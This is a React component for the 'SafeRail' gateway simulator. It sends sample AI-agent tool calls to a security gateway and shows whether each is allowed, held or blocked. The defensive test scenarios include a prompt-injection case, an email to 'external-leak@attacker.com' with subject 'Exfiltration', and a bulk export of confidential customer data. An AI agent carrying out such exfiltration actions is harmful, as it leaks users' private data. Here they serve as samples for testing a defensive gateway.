import React, { useState } from 'react';
import {
  Play,
  XCircle,
  Hash,
  Terminal,
  X,
  Sparkles
} from 'lucide-react';
import { submitToolCall } from '../../api/client';
import { ToolCallResponse } from '../../types';

interface GatewaySimulatorModalProps {
  isOpen: boolean;
  onClose: () => void;
  onActionComplete?: () => void;
}

export const GatewaySimulatorModal: React.FC<GatewaySimulatorModalProps> = ({
  isOpen,
  onClose,
  onActionComplete
}) => {
  const [selectedAgent, setSelectedAgent] = useState('agent-demo');
  const [selectedTool, setSelectedTool] = useState('read_ticket');
  const [customParams, setCustomParams] = useState('{\n  "ticket_id": "TICKET-101"\n}');
  const [untrustedFlag, setUntrustedFlag] = useState(false);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<ToolCallResponse | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  if (!isOpen) return null;

  const runPredefined = async (tool: string, params: Record<string, any>, isUntrusted: boolean = false) => {
    setSelectedTool(tool);
    setCustomParams(JSON.stringify(params, null, 2));
    setUntrustedFlag(isUntrusted);
    await executeCall(tool, params, isUntrusted);
  };

  const executeCall = async (tool: string, params: Record<string, any>, isUntrusted: boolean) => {
    setLoading(true);
    setErrorMsg(null);
    setResult(null);

    try {
      const response = await submitToolCall({
        agent_id: selectedAgent,
        session_id: `session-sim-${Date.now().toString().slice(-4)}`,
        tool_name: tool,
        action_details: params,
        untrusted_content_ids: isUntrusted ? ["ticket-injection-01"] : undefined
      });
      setResult(response);
      if (onActionComplete) onActionComplete();
    } catch (err: any) {
      setErrorMsg(err.message || 'Gateway interception failed');
    } finally {
      setLoading(false);
    }
  };

  const handleCustomSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const parsed = JSON.parse(customParams);
      await executeCall(selectedTool, parsed, untrustedFlag);
    } catch (err) {
      setErrorMsg('Invalid JSON in action details payload.');
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm p-4">
      <div className="bg-[#0d1527] border border-[#19253d] rounded-2xl max-w-2xl w-full p-6 shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Modal Header */}
        <div className="flex items-start justify-between pb-4 border-b border-[#19253d]">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400">
              <Terminal className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white tracking-wide flex items-center gap-2">
                <span>Gateway Action Simulator</span>
                <span className="text-[10px] bg-cyan-950/60 text-cyan-400 border border-cyan-500/30 px-2 py-0.5 rounded font-mono">
                  POST /api/v1/tool_call
                </span>
              </h2>
              <p className="text-xs text-slate-400">
                Trigger simulated AI agent operations through SafeRail fail-closed security gateway
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-[#152038] transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="overflow-y-auto py-4 space-y-4 pr-1">
          {/* Quick Predefined Scenarios */}
          <div>
            <div className="text-xs font-semibold text-slate-300 mb-2 flex items-center gap-1.5">
              <Sparkles className="w-3.5 h-3.5 text-amber-400" />
              <span>Quick Test Scenarios (Stage 2 Verification):</span>
            </div>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs">
              <button
                type="button"
                onClick={() => runPredefined('read_ticket', { ticket_id: "TICKET-101" }, false)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-emerald-400">1. Read Ticket</div>
                <div className="text-[10px] text-emerald-400 mt-0.5">Tier 0 → ALLOW</div>
              </button>

              <button
                type="button"
                onClick={() => runPredefined('send_email', { to: "user@example.com", subject: "Welcome", body: "Account info" }, false)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-emerald-400">2. Allowed Email</div>
                <div className="text-[10px] text-emerald-400 mt-0.5">Tier 1 → ALLOW</div>
              </button>

              <button
                type="button"
                onClick={() => runPredefined('issue_refund', { customer_id: "user_7832", amount: 250.0, reason: "Duplicate charge" }, false)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-amber-400">3. Large Refund ($250)</div>
                <div className="text-[10px] text-amber-400 mt-0.5">Tier 2 → HOLD</div>
              </button>

              <button
                type="button"
                onClick={() => runPredefined('send_email', { to: "external-leak@attacker.com", subject: "Exfiltration", body: "Secret dumps" }, true)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-rose-400">4. Untrusted Injection</div>
                <div className="text-[10px] text-rose-400 mt-0.5">Tier X → BLOCK</div>
              </button>

              <button
                type="button"
                onClick={() => runPredefined('export_customers', { format: "csv", filter: "all_confidential" }, false)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-rose-400">5. Prohibited Export</div>
                <div className="text-[10px] text-rose-400 mt-0.5">Tier X → BLOCK</div>
              </button>

              <button
                type="button"
                onClick={() => runPredefined('delete_records', { record_type: "user_profile", record_id: "user_4567" }, false)}
                className="p-2.5 rounded-lg bg-[#090e1a] hover:bg-[#141f34] border border-[#19253d] text-left transition-colors group"
              >
                <div className="font-semibold text-white group-hover:text-amber-400">6. Delete Records</div>
                <div className="text-[10px] text-amber-400 mt-0.5">Tier 3 → HOLD</div>
              </button>
            </div>
          </div>

          {/* Custom Action Configuration */}
          <form onSubmit={handleCustomSubmit} className="space-y-3 pt-2 border-t border-[#19253d]">
            <div className="grid grid-cols-2 gap-3 text-xs">
              <div>
                <label className="block text-slate-400 mb-1">Target Agent</label>
                <select
                  value={selectedAgent}
                  onChange={(e) => setSelectedAgent(e.target.value)}
                  className="w-full bg-[#090e1a] border border-[#19253d] rounded-lg px-2.5 py-1.5 text-white focus:outline-none focus:border-cyan-500"
                >
                  <option value="agent-demo">Demo Agent</option>
                  <option value="agent-res">Research Agent</option>
                  <option value="agent-ana">Analysis Agent</option>
                  <option value="agent-tool">Tool Agent</option>
                  <option value="agent-safe">Safety Agent</option>
                </select>
              </div>

              <div>
                <label className="block text-slate-400 mb-1">Tool to Execute</label>
                <select
                  value={selectedTool}
                  onChange={(e) => setSelectedTool(e.target.value)}
                  className="w-full bg-[#090e1a] border border-[#19253d] rounded-lg px-2.5 py-1.5 text-white focus:outline-none focus:border-cyan-500"
                >
                  <option value="read_ticket">read_ticket</option>
                  <option value="send_email">send_email</option>
                  <option value="issue_refund">issue_refund</option>
                  <option value="export_customers">export_customers</option>
                  <option value="delete_records">delete_records</option>
                  <option value="update_profile">update_profile</option>
                </select>
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-xs text-slate-400">Action Parameters (JSON)</label>
                <label className="flex items-center gap-1.5 text-xs text-amber-400 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={untrustedFlag}
                    onChange={(e) => setUntrustedFlag(e.target.checked)}
                    className="rounded bg-slate-800 border-slate-700"
                  />
                  <span>Attach Untrusted Content Tag</span>
                </label>
              </div>
              <textarea
                value={customParams}
                onChange={(e) => setCustomParams(e.target.value)}
                rows={3}
                className="w-full font-mono text-xs bg-[#090e1a] border border-[#19253d] rounded-lg p-2.5 text-cyan-300 focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="flex justify-end">
              <button
                type="submit"
                disabled={loading}
                className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white rounded-lg text-xs font-semibold flex items-center gap-2 shadow-lg disabled:opacity-50"
              >
                <Play className="w-3.5 h-3.5 fill-current" />
                <span>{loading ? 'Evaluating via Gateway...' : 'Submit to Safety Gateway'}</span>
              </button>
            </div>
          </form>

          {/* Error Notice */}
          {errorMsg && (
            <div className="p-3 rounded-lg bg-rose-950/40 border border-rose-500/40 text-rose-300 text-xs flex items-center gap-2">
              <XCircle className="w-4 h-4 shrink-0 text-rose-400" />
              <span>{errorMsg}</span>
            </div>
          )}

          {/* Gateway Decision Output */}
          {result && (
            <div className="p-4 rounded-xl bg-[#090e1a] border border-[#19253d] space-y-3 animate-fadeIn">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white">Gateway Interception Result</span>
                <div className="flex items-center gap-2">
                  <span className={`px-2.5 py-0.5 rounded text-xs font-bold ${
                    result.decision === 'ALLOW' ? 'bg-emerald-950/70 text-emerald-400 border border-emerald-500/40' :
                    result.decision === 'HOLD' ? 'bg-amber-950/70 text-amber-400 border border-amber-500/40' :
                    'bg-rose-950/70 text-rose-400 border border-rose-500/40'
                  }`}>
                    {result.decision}
                  </span>
                  <span className="text-xs text-slate-400 font-mono">
                    {result.risk_tier} (Score: {result.risk_score}/100)
                  </span>
                </div>
              </div>

              <div className="text-xs text-slate-300 bg-[#0d1527] p-2.5 rounded border border-[#19253d]">
                <strong>Policy Explanation:</strong> {result.reason}
              </div>

              {result.fingerprint && (
                <div className="flex items-center gap-1.5 text-[11px] text-cyan-400 font-mono bg-[#0d1527] p-2 rounded border border-[#19253d] truncate">
                  <Hash className="w-3.5 h-3.5 shrink-0" />
                  <span className="text-slate-400 shrink-0">Fingerprint:</span>
                  <span className="truncate">{result.fingerprint}</span>
                </div>
              )}

              {result.execution_result && (
                <div className="text-xs text-slate-300">
                  <div className="text-[11px] text-slate-400 mb-1">Sandbox Execution Output:</div>
                  <pre className="p-2 rounded bg-slate-950 text-emerald-400 font-mono text-[11px] overflow-x-auto border border-emerald-900/30">
                    {JSON.stringify(result.execution_result, null, 2)}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
